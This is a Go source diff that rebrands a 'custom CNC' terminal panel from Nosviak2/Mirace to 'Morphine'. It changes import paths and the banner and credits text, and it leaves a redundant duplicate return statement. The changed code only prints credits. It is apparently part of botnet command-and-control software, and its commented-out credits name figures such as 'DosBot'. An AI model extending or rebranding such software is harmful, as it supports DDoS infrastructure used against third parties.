@@ -1,11 +1,12 @@
 package commands
 
 import (
-	"Nosviak2/core/clients/sessions"
-	"Nosviak2/core/clients/views/pager"
-	//"Nosviak2/core/configs"
-	"Nosviak2/core/sources/tools/gradient"
-	"Nosviak2/core/sources/layouts/toml"
+	"Morphine/core/clients/sessions"
+	"Morphine/core/clients/views/pager"
+
+	//"Morphine/core/configs"
+	"Morphine/core/sources/layouts/toml"
+	"Morphine/core/sources/tools/gradient"
 	"strings"
 )
 
@@ -22,21 +23,21 @@ func init() {
 			if toml.DecorationToml.Gradient.EnableWithCredits { //performs the gradient properly
 				//this will perform the gradient on each layer properly
 				//this will ensure its done without issues happening on purpose
-				Targets, err := BuildCredits(s.Colours, []string{"","  Mirace is a custom CNC with many customize and more options.","  Self developed by t.me/setupceramic (14.12.2023)",})
+				Targets, err := BuildCredits(s.Colours, []string{"", "  Morphine is a custom CNC with many customize and more options.", "  Self developed by t.me/setupceramic (14.12.2023)"})
 				if err != nil { //error handles properly
 					return err
 				}
-				//s.Write(" \x1b[38;5;135mNosviak2 "+deployment.Version+"\x1b[0m -\x1b[38;5;9m FB \x1b[0m- \x1b[38;5;11mstable\x1b[0m\r\n")
-				s.Write("  \x1b[38;5;111mMirace CNC \x1b[0m| \x1b[38;5;3mStable Build\x1b[0m\r\n")
+				//s.Write(" \x1b[38;5;135mMorphine "+deployment.Version+"\x1b[0m -\x1b[38;5;9m FB \x1b[0m- \x1b[38;5;11mstable\x1b[0m\r\n")
+				s.Write("  \x1b[38;5;111mMorphine CNC \x1b[0m| \x1b[38;5;3mStable Build\x1b[0m\r\n")
 				//writes to the connection
 				//this will ensure its done without issues
-				return s.Write(strings.Join(Targets, "\r\n")+"\r\n") //returns properly
+				return s.Write(strings.Join(Targets, "\r\n") + "\r\n") //returns properly
 			}
-			//s.Write("\x1b[38;5;105mNosviak2 "+deployment.Version+"\x1b[0m -\x1b[38;5;9m FB \x1b[0m- \x1b[38;5;11mstable\x1b[0m\r\n")
+			//s.Write("\x1b[38;5;105mMorphine "+deployment.Version+"\x1b[0m -\x1b[38;5;9m FB \x1b[0m- \x1b[38;5;11mstable\x1b[0m\r\n")
 			//s.Write(" \r\n")
-			//s.Write(" Nosviak2 has been completely developed by FB and nobody else.\r\n")
+			//s.Write(" Morphine has been completely developed by FB and nobody else.\r\n")
 			//s.Write(" This product contains over 20,000 lines of Go code and many\r\n")
-			//s.Write(" features curated for the future clients of Nosviak...\r\n")
+			//s.Write(" features curated for the future clients of Morphine...\r\n")
 			//s.Write("\r\n")
 			//s.Write(" Advocates: prmze, mnnpwn, DosBot, 0xyLace, Pazdano, Boss,\r\n")
 			//s.Write("  Cupid, Null, NotTurpzy, DownMyPath, RP, Bermuda, Space, Bleach.\r\n")
@@ -44,17 +45,17 @@ func init() {
 			//s.Write(" Inspiration: Putin")
 			//s.Write("\r\n")
 			//s.Write(" Contact destinations: Discord:FB#7037, Telegram:@FB\r\n")
-			s.Write("  \x1b[38;5;111mMirace CNC \x1b[0m| \x1b[38;5;3mStable Build\x1b[0m\r\n")
+			s.Write("  \x1b[38;5;111mMorphine CNC \x1b[0m| \x1b[38;5;3mStable Build\x1b[0m\r\n")
 			s.Write("  \r\n")
-			s.Write("  Mirace is a custom CNC with many customize and more options.\r\n")
+			s.Write("  Morphine is a custom CNC with many customize and more options.\r\n")
 			s.Write("  Self developed by t.me/setupceramic (14.12.2023)\r\n")
 			return nil
 		},
 	})
 }
 
-//returns the array of strings and returns the error
-//this will ensure its done without issues without errors
+// returns the array of strings and returns the error
+// this will ensure its done without issues without errors
 func BuildCredits(colours [][]int, text []string) ([]string, error) {
 	var longest int = pager.GetLongestLineWithSTRIP(text)
 
@@ -67,6 +68,7 @@ func BuildCredits(colours [][]int, text []string) ([]string, error) {
 		}
 
 		text[line] = l
-	}; return text, nil
+	}
+	return text, nil
 	return text, nil
 }
